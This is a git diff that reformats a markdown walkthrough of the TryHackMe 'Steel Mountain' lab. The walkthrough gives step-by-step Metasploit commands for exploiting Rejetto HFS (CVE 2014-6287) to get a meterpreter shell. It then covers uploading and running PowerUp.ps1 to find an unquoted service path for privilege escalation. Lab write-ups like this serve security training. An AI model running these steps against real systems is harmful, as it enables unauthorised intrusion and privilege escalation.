@@ -27,25 +27,25 @@
     - **Answer** : 2014-6287
 - Use Metasploit to get an initial shell. What is the user flag?
     - Start metasploit
-        msfconsole
+        - msfconsole
     - find the exploit
-        search exploit rejetto
-        Picture: [Steel_Moutain_7.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_7.png)
+        - search exploit rejetto
+        - Picture: [Steel_Moutain_7.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_7.png)
     - Select the exploit
-        use [payload number]
-        Picture: [Steel_Moutain_8.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_8.png)
+        - use [payload number]
+        - Picture: [Steel_Moutain_8.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_8.png)
     - Check the options
-        options
-        Picture: [Steel_Moutain_9.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_9.png)
+        - options
+        - Picture: [Steel_Moutain_9.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_9.png)
     - Indicate the remote hosts ip and port (This server run on port 8080)
-        set RHOSTS [IP]
-        set RPORT [port]
-        Picture: [Steel_Moutain_10.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_10.png)
+        - set RHOSTS [IP]
+        - set RPORT [port]
+        - Picture: [Steel_Moutain_10.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_10.png)
     - Chenge the Local IP with your IP
         set LHOST [IP]
     - Execute
-        run
-        Picture: [Steel_Moutain_11.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_11.png)
+        - run
+        - Picture: [Steel_Moutain_11.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_11.png)
     - Remeber, the machine is a Windows machine.Not all  Linux command work ^_^
     - Move to C:\Users\bill\Desktop
     - Open user.txt
@@ -55,18 +55,18 @@
 ### Task 3 - Privilege escalation
 - download the script Link: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 - Upload the script through meterpreter
-    upload [path]/PowerUp.ps1
+    - upload [path]/PowerUp.ps1
     - Picture: [Steel_Moutain_13.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_13.png)
 - Load powershell
-    load powershell
+    - load powershell
     - Picture: [Steel_Moutain_14.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_13.png)
 - Access powershell
-    powershell_shell
+    - powershell_shell
     - Picture: [Steel_Moutain_15.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_15.png)
 - Execute the powershell script
-    . .\PowerUp.ps1  
+    - . .\PowerUp.ps1  
 - Perform a check
-    Invoke-AllChecks
+    - Invoke-AllChecks
     - Picture: [Steel_Moutain_16.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_16.png)
 - Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
     - Picture: [Steel_Moutain_17.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_16.png)
